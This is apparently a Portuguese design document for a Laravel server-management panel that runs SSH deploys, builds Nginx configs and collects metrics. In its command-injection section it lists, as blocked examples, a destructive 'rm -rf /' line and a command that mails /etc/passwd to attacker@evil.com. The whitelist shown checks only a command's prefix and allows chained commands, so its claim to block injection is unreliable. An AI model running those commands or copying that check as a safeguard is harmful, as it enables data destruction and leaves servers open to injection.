# Estrutura do Projeto - Server Manager

## Visão Geral da Arquitetura

```
server_manager/
├── app/
│   ├── Http/
│   │   ├── Controllers/
│   │   │   └── Api/
│   │   │       ├── ServerController.php      # CRUD de servidores + ações SSH
│   │   │       ├── SiteController.php        # CRUD de sites + config Nginx
│   │   │       └── DeploymentController.php  # Deploys + rollback
│   │   └── Middleware/
│   ├── Models/
│   │   ├── Server.php          # Servidor + credenciais SSH (criptografadas)
│   │   ├── Site.php            # Aplicação/site no servidor
│   │   ├── Deployment.php      # Histórico de deploys
│   │   ├── ServerMetric.php    # Métricas coletadas
│   │   └── User.php            # Usuário do painel
│   ├── Services/
│   │   ├── SSHConnectionService.php      # Conexões SSH via phpseclib
│   │   ├── MetricsCollectorService.php   # Coleta CPU, RAM, Disco, Uptime
│   │   ├── DeploymentService.php         # Lógica de deploy completa
│   │   └── NginxConfigService.php        # Geração de configs Nginx
│   ├── Jobs/
│   │   ├── CollectServerMetrics.php      # Job para coletar métricas
│   │   └── ExecuteDeployment.php         # Job para executar deploy
│   └── Policies/
│       ├── ServerPolicy.php    # Autorização para servidores
│       ├── SitePolicy.php      # Autorização para sites
│       └── DeploymentPolicy.php
├── database/
│   └── migrations/
│       ├── 2026_02_05_145844_create_servers_table.php
│       ├── 2026_02_05_145848_create_sites_table.php
│       ├── 2026_02_05_145907_create_deployments_table.php
│       └── 2026_02_05_145907_create_server_metrics_table.php
├── routes/
│   ├── api.php         # Rotas da API REST
│   ├── web.php         # Rotas web (dashboard - a implementar)
│   └── console.php     # Schedule para coleta de métricas
└── config/
    └── horizon.php     # Configuração de filas
```

## Decisões Arquiteturais

### 1. **Separation of Concerns - Services**

Optei por criar **Services** dedicados ao invés de colocar toda a lógica nos Controllers ou Models:

- **SSHConnectionService**: Responsável exclusivamente por gerenciar conexões SSH
  - Isolamento da biblioteca `phpseclib3`
  - Facilita testes mockando o service
  - Reutilizável em diferentes contextos
  
- **MetricsCollectorService**: Especializado em coletar métricas
  - Comandos SSH específicos para cada métrica
  - Parsing de outputs complexos
  - Salva ou apenas retorna dados (flexível)
  
- **DeploymentService**: Orquestra todo o processo de deploy
  - Git clone/pull
  - Execução de scripts
  - Rollback
  - Logging detalhado
  
- **NginxConfigService**: Geração e deploy de configurações Nginx
  - Templates de configuração
  - Validação antes de reload
  - Suporte a SSL

**Vantagens:**
- Código mais testável
- Reutilização fácil
- Manutenção simplificada
- Separação clara de responsabilidades

### 2. **Jobs para Operações Assíncronas**

Operações demoradas são executadas via **Horizon (Redis Queue)**:

- **CollectServerMetrics**: Coleta métricas de forma assíncrona
  - Evita timeout em requests HTTP
  - Retry automático em caso de falha
  - Escala para múltiplos servidores
  
- **ExecuteDeployment**: Deploy em background
  - Pode demorar vários minutos
  - Não bloqueia o usuário
  - Logs em tempo real (via polling ou websockets)

**Configuração de Retry:**
```php
public int $tries = 3;        // 3 tentativas
public int $backoff = 60;     // Espera 60s entre tentativas
public int $timeout = 120;    // Timeout de 2 minutos
```

### 3. **Criptografia de Dados Sensíveis**

Todos os dados sensíveis são criptografados no banco usando `Crypt::encryptString()`:

**Server Model:**
```php
// Automático via Accessors/Mutators
$server->ssh_key = "-----BEGIN RSA...";  // Salva criptografado
echo $server->ssh_key;                    // Retorna descriptografado
```

**Dados Criptografados:**
- `servers.ssh_key`
- `servers.ssh_password`
- `sites.git_token`
- `sites.env_variables` (JSON criptografado)

**Segurança:**
- Usa a `APP_KEY` do Laravel
- Impossível descriptografar sem a chave
- Hidden dos arrays/JSON por padrão

### 4. **Multi-Tenant via Policies**

Cada usuário só acessa seus próprios servidores:

```php
// ServerPolicy
public function view(User $user, Server $server): bool
{
    return $user->id === $server->user_id;
}

// SitePolicy (via servidor)
public function view(User $user, Site $site): bool
{
    return $user->id === $site->server->user_id;
}
```

**Uso nos Controllers:**
```php
$this->authorize('view', $server);
```

### 5. **Scheduler para Coleta Automática**

Métricas são coletadas automaticamente a cada minuto:

```php
// routes/console.php
Schedule::call(function () {
    Server::where('status', '!=', 'offline')
        ->chunk(10, function ($servers) {
            foreach ($servers as $server) {
                CollectServerMetrics::dispatch($server);
            }
        });
})->everyMinute();
```

**Por que chunk?**
- Evita carregar todos os servidores em memória
- Processa em lotes de 10
- Escala para centenas de servidores

### 6. **Validação de Comandos SSH**

Proteção contra **Command Injection**:

```php
// SSHConnectionService
private function isWhitelisted(string $command): bool
{
    $patterns = ['/^git /', '/^composer /', '/^php artisan /'];
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $command)) return true;
    }
    return false;
}
```

**Comandos perigosos bloqueados:**
```bash
# Bloqueado
rm -rf /; echo "hacked"
cat /etc/passwd | mail attacker@evil.com

# Permitido (whitelisted)
git pull && composer install && php artisan migrate
```

### 7. **Relacionamentos Eloquent**

Otimização de queries com Eager Loading:

```php
// Controller
$servers = Server::with([
    'metrics' => fn($q) => $q->latest()->limit(60),
    'sites'
])->get();
```

**Evita N+1 queries:**
- 1 query para servers
- 1 query para metrics
- 1 query para sites
- Total: 3 queries ao invés de 1 + N + M

### 8. **Status Tracking**

Estados claros para cada entidade:

**Server:**
- `online` - Respondendo
- `offline` - Não responde
- `provisioning` - Sendo configurado
- `error` - Erro crítico

**Site:**
- `active` - Funcionando
- `inactive` - Criado mas não ativo
- `deploying` - Deploy em andamento
- `error` - Erro no deploy

**Deployment:**
- `pending` - Aguardando
- `running` - Executando
- `success` - Concluído
- `failed` - Falhou
- `rolled_back` - Revertido

### 9. **Logging Detalhado**

Cada deployment possui log completo:

```php
$deployment->appendLog("Deployment started by {$user->name}");
$deployment->appendLog("Connecting to server...");
$deployment->appendLog("> composer install");
$deployment->appendLog("Loading composer repositories...");
```

**Formato:**
```
[2024-01-01 10:00:00] Deployment started by Admin
[2024-01-01 10:00:01] Connecting to server Prod Server...
[2024-01-01 10:00:02] Connected successfully
[2024-01-01 10:00:03] > git pull origin main
[2024-01-01 10:00:05] Already up to date.
...
```

### 10. **Helper Methods nos Models**

Models com métodos úteis:

```php
// Server
$server->isOnline()
$server->latestMetric()

// Site
$site->latestDeployment()
$site->successfulDeployments()
$site->full_path  // Accessor: /var/www/{domain}

// Deployment
$deployment->isSuccessful()
$deployment->markAsStarted()
$deployment->markAsFailed($error)

// ServerMetric
$metric->memory_usage_percentage  // Calculado
$metric->disk_usage_percentage
$metric->uptime_human  // "5d 12h 30m"
```

## Fluxo de Dados

### Coleta de Métricas

```
Scheduler (every minute)
    ↓
CollectServerMetrics Job (dispatched)
    ↓
MetricsCollectorService
    ↓
SSHConnectionService (execute commands)
    ↓
Parse outputs
    ↓
Save to server_metrics table
    ↓
Update server.status = 'online'
```

### Deploy

```
User triggers deploy (POST /api/deployments)
    ↓
DeploymentController validates
    ↓
ExecuteDeployment Job (dispatched)
    ↓
DeploymentService
    ↓
1. Create deployment record (pending)
2. Mark as running
3. SSH connect
4. Git pull/clone
5. Execute deploy script
6. Get commit info
7. Mark as success/failed
```

## Comandos SSH Utilizados

### Métricas

```bash
# CPU Usage (%)
top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1

# Memory (MB)
free -m | grep Mem | awk '{print $3, $2}'

# Disk (GB)
df -BG / | tail -1 | awk '{print $3, $2}' | sed 's/G//g'

# Uptime (seconds)
cat /proc/uptime | awk '{print $1}' | cut -d'.' -f1

# Service status
systemctl is-active nginx
systemctl show -p MainPID nginx | cut -d'=' -f2
```

### Deploy

```bash
# Git operations
git clone -b main https://token@github.com/user/repo.git /var/www/site
git fetch origin
git reset --hard origin/main
git pull origin main

# Laravel deploy
composer install --no-dev --optimize-autoloader
php artisan migrate --force
php artisan config:cache
php artisan route:cache
php artisan view:cache
php artisan queue:restart

# Get commit info
git rev-parse --short HEAD
git log -1 --pretty=%B
```

### Nginx

```bash
# Deploy config
ln -sf /etc/nginx/sites-available/domain /etc/nginx/sites-enabled/domain

# Test config
nginx -t

# Reload
systemctl reload nginx
```

## Performance

### Otimizações Implementadas

1. **Eager Loading**: Reduz N+1 queries
2. **Chunking**: Processa servidores em lotes
3. **Queue Jobs**: Operações demoradas em background
4. **Indexes**: Em colunas frequently queried
5. **Cache**: Redis para cache e sessões

### Escalabilidade

- **Horizontal**: Adicionar mais workers do Horizon
- **Vertical**: Aumentar recursos do servidor
- **Múltiplos Servidores**: Chunk processa em lotes

## Segurança

### Checklist Implementado

- ✅ Criptografia de credenciais
- ✅ Validação de comandos SSH
- ✅ Policies para autorização
- ✅ Sanitização de inputs
- ✅ HTTPS recomendado (produção)
- ✅ Tokens via Sanctum
- ⬜ Rate limiting (a implementar)
- ⬜ 2FA (a implementar)
- ⬜ Audit logging (integrar spatie/activitylog)

## Próximos Passos

1. **Frontend**: Livewire 3 ou Inertia + Vue 3
2. **WebSockets**: Real-time deployment logs
3. **Webhooks**: Auto-deploy no git push
4. **SSL**: Integração com Let's Encrypt
5. **Backups**: Automated database backups
6. **Monitoring**: Alertas quando servidor fica offline
7. **Firewall**: Management de UFW rules
8. **Cron**: Management de cron jobs
